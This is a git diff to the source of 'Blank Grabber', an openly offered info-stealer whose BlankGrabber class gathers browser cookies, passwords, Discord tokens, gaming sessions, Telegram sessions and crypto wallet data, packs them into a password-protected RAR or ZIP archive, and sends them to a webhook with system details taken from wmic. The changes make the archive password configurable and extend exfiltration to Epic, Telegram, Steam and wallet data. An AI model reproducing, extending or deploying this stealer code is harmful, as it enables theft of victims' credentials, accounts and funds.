@@ -35,6 +35,7 @@ class Settings:
     Vmprotect = bool("%vmprotect%")
     Startup = bool("%startup%")
     Melt = bool("%melt%")
+    ArchivePassword = "%archivepassword%"
 
     CaptureWebcam = bool("%capturewebcam%")
     CapturePasswords = bool("%capturepasswords%")
@@ -1298,13 +1299,13 @@ class BlankGrabber:
         if Utility.GetSelf()[1] or os.path.isfile(rarPath):
             rarPath = os.path.join(sys._MEIPASS, "rar.exe")
             if os.path.isfile(rarPath):
-                password = "blank"
+                password = Settings.ArchivePassword or "blank"
                 process = subprocess.run('{} a -r -hp{} "{}" *'.format(rarPath, password, self.ArchivePath), capture_output= True, shell= True, cwd= self.TempFolder)
                 if process.returncode == 0:
-                    return ("rar", password)
+                    return "rar"
         
         shutil.make_archive(self.ArchivePath.rsplit(".", 1)[0], "zip", self.TempFolder) # Creates simple unprotected zip file if the above process fails
-        return ("zip", None)
+        return "zip"
 
     def GenerateTree(self) -> None: # Generates tree of the collected data
         if os.path.isdir(self.TempFolder):
@@ -1334,8 +1335,8 @@ class BlankGrabber:
                 pass
 
     def SendData(self) -> None: # Sends data to the webhook
-        extention, password = self.CreateArchive()
-        if (self.Cookies or self.Passwords or self.RobloxCookies or self.DiscordTokens or self.MinecraftSessions) and os.path.isfile(self.ArchivePath):
+        extention = self.CreateArchive()
+        if (self.Cookies or self.Passwords or self.EpicCount or self.TelegramSessions or self.SteamCount or self.WalletsCount or self.RobloxCookies or self.DiscordTokens or self.MinecraftSessions) and os.path.isfile(self.ArchivePath):
             computerName = os.getenv("computername")
             computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
             totalMemory = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1])/1000000000)) + " GB"
@@ -1379,7 +1380,7 @@ class BlankGrabber:
             image_url = "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
 
             payload = {
-  "content": ("||@everyone||" if Settings.PingMe else "") + (" Archive Password: `{}`".format(password) if password else ""),
+  "content": "||@everyone||" if Settings.PingMe else "",
   "embeds": [
     {
       "title": "Blank Grabber",
